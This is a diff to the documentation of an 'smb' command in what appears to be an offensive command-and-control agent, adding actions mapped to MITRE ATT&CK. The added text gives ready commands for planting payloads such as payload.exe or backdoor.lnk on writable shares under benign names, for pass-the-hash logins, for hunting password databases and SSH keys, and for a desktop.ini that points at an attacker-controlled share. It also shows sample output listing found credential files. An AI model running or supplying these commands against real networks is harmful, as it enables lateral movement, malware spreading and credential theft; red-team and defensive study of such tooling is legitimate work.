@@ -15,7 +15,7 @@ Uses the `go-smb2` library for SMB2 protocol operations (pure Go, CGO_ENABLED=0)
 
 Argument | Required | Description
 ---------|----------|------------
-action | Yes | Operation: `shares`, `ls`, `cat`, `upload`, `rm`, `mkdir`, `mv`, `push` (lateral tool transfer)
+action | Yes | Operation: `shares`, `ls`, `cat`, `upload`, `rm`, `mkdir`, `mv`, `push` (lateral tool transfer), `taint` (plant files on writable shares), `exfil` (data exfiltration), `share-perms` (test read/write access), `share-spider` (recursive listing), `share-search` (find sensitive files)
 host | Yes | Target host IP or hostname
 username | Yes | Username for NTLM auth (supports `DOMAIN\user` or `user@domain` format)
 password | No* | Password for NTLM auth (*required unless `-hash` is provided)
@@ -25,8 +25,13 @@ share | Conditional | Share name (e.g., `C$`, `ADMIN$`, `SYSVOL`). Required for 
 path | Conditional | Path within the share. Required for cat, upload, rm, mkdir, mv, push. For mv, this is the source path.
 content | Conditional | File content to write (required for upload action)
 destination | Conditional | Target path within the share (required for mv action)
-source | Conditional | Local file path on the agent to push (required for push action)
+source | Conditional | Local file path on the agent to push (required for push and taint actions)
+plant_name | No | Filename to plant on shares (for taint action, e.g., `update.exe`). Defaults to source filename.
 port | No | SMB port (default: 445)
+depth | No | Max directory recursion depth for share-spider and share-search (default: 3)
+extensions | No | Comma-separated file extension filter for share-spider (e.g., `.docx,.xlsx,.pdf`)
+patterns | No | Comma-separated filename patterns for share-search (e.g., `*.kdbx,passwords.*`). Defaults to built-in sensitive file patterns.
+max_results | No | Maximum number of results to return (default: 500 for spider, 200 for search)
 
 ## Usage
 
@@ -71,6 +76,38 @@ smb -action push -host 192.168.1.1 -share C$ -path temp/payload.exe -source /tmp
 smb -action push -host dc01 -share ADMIN$ -path payload.exe -source /opt/tools/fawkes.exe -username admin -hash 8846f7eaee8fb117 -domain CORP
 ```
 
+Taint shared content — plant a file on all writable shares (T1080):
+```
+smb -action taint -host 192.168.1.1 -source /tmp/payload.exe -plant_name update.exe -username admin -password pass -domain CORP
+```
+
+Taint a specific share:
+```
+smb -action taint -host 192.168.1.1 -share SYSVOL -source /tmp/backdoor.lnk -plant_name report.lnk -username admin -hash 8846f7eaee8fb117 -domain CORP
+```
+
+Taint with inline content (e.g., a desktop.ini):
+```
+smb -action taint -host 192.168.1.1 -content "[.ShellClassInfo]\nIconResource=\\attacker\share\icon.dll,0" -plant_name desktop.ini -username admin -password pass -domain CORP
+```
+
+Test read/write access on all shares (share-perms):
+```
+smb -action share-perms -host 192.168.1.1 -username admin -password pass -domain CORP
+```
+
+Recursively list files on a share (share-spider):
+```
+smb -action share-spider -host 192.168.1.1 -share SYSVOL -username admin -password pass -domain CORP -depth 5
+smb -action share-spider -host 192.168.1.1 -share Data -path Projects -extensions .docx,.xlsx,.pdf -max_results 100 -username admin -hash 8846f7eaee8fb117 -domain CORP
+```
+
+Search for sensitive files across all shares (share-search):
+```
+smb -action share-search -host 192.168.1.1 -username admin -password pass -domain CORP
+smb -action share-search -host 192.168.1.1 -share C$ -patterns *.kdbx,web.config,id_rsa -depth 5 -username admin -password pass -domain CORP
+```
+
 ### Pass-the-Hash (PTH)
 
 Use `-hash` instead of `-password` with an NT hash (from hashdump, secretsdump, etc.):
@@ -105,6 +142,31 @@ Size          Modified              Name
 0 B           2025-10-08 04:35:12   Public/
 0 B           2026-01-15 08:22:45   setup/
 0 B           2025-10-08 04:35:12   Default/
+```
+
+### Share Permissions
+```json
+[
+  {"share":"ADMIN$","read":true,"write":true,"files":24,"remark":"Windows system directory"},
+  {"share":"C$","read":true,"write":true,"files":9,"remark":"Administrative drive share"},
+  {"share":"Data","read":true,"write":false,"files":42,"remark":"42 entries"},
+  {"share":"IPC$","read":false,"error":"mount failed: access denied","remark":""},
+  {"share":"SYSVOL","read":true,"write":false,"files":3,"remark":"Active Directory SYSVOL"}
+]
+```
+
+### Share Search
+```json
+{
+  "host": "192.168.100.52",
+  "patterns": ["*.kdbx","*.pfx","web.config","id_rsa"],
+  "depth": 3,
+  "count": 2,
+  "matches": [
+    {"share":"Data","path":"IT\\passwords.kdbx","size":2048,"modified":"2026-01-15 10:30:00","pattern":"*.kdbx"},
+    {"share":"C$","path":"inetpub\\wwwroot\\web.config","size":1024,"modified":"2025-12-01 14:00:00","pattern":"web.config"}
+  ]
+}
 ```
 
 ## SMB Command vs Native File Commands
@@ -152,6 +214,10 @@ On Windows, `make-token` creates an impersonation token from credentials. While 
 | Delete file on remote host | `smb -action rm` |
 | Create directory on remote host | `smb -action mkdir` |
 | Rename/move file on remote host | `smb -action mv` |
+| Plant file on writable shares | `smb -action taint` |
+| Test read/write access on all shares | `smb -action share-perms` |
+| Recursive directory listing | `smb -action share-spider` |
+| Find sensitive files across shares | `smb -action share-search` |
 | List files locally | `ls` |
 | Copy file locally | `cp` |
 | Read file locally | `cat` |
@@ -167,6 +233,9 @@ On Windows, `make-token` creates an impersonation token from credentials. While 
 ## MITRE ATT&CK Mapping
 
 - **T1021.002** - Remote Services: SMB/Windows Admin Shares
+- **T1039** - Data from Network Shared Drive (share-search)
+- **T1080** - Taint Shared Content (taint action)
+- **T1135** - Network Share Discovery (share-perms, share-spider)
 - **T1550.002** - Use Alternate Authentication Material: Pass the Hash
 - **T1570** - Lateral Tool Transfer (push action)
 
